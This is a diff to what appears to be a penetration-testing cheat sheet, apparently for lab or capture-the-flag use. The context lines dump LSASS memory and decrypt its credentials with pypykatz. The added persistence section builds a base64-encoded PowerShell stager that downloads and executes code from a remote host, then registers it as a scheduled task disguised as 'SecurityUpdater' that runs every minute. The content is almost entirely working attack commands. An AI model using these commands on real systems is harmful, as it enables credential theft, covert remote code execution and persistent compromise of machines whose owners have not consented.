@@ -39,3 +39,24 @@ procdump --pid 660 --save /tmp/lsass.dmp
 
 pypykatz lsa minidump /tmp/lsass.dmp # decrypt it
 ```
+---
+# persistence
+
+### schtasks
+
+we base-64 of stager:
+```powershell
+echo -en "iex(new-object net.webclient).downloadString('http://10.10.14.62:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0
+
+# or
+$command = "iex(new-object net.webclient).downloadString('http://10.10.14.62:8088/stager.txt')"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encoded = [Convert]::ToBase64String($bytes)
+$encoded
+
+```
+
+ to be used with schtasks. 
+```powershell
+execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr \"powershell.exe -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAMgA6ADgAMAA4ADgALwBzAHQAYQBnAGUAcgAuAHQAeAB0ACcAKQA="'
+```
